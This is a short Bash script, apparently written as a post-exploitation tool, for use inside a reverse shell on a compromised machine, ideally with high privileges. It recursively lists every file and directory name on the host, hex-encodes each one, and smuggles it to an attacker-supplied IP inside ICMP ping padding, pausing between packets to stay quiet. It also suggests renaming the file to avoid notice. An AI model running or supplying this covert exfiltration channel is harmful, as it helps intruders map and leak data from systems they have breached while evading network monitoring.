#!/bin/bash

ip=$1


ayuda() {
    echo "To be executed in a reverse shell (ideally with highest privileges)."
    echo "Change this file name for whatever you find more convenient."
    echo "Usage: $(basename "$0") [YOUR IP]"
}

enviar() {
    todosdirs=$(ls -aR /)
    for ddd in ${todosdirs[@]}; do
        # ping transmite en hexadecimal
        msg=$(echo -n $ddd | hexdump -v -e '/1 "%02x"')
        ping $ip -q -c 1 -p $msg
        sleep 5
    done
}

if [[ "$1" == "-h" || "$1" == "--help" || "$1" == "" ]]; then
  ayuda
else
  enviar
fi

# mppr. J.G.V.
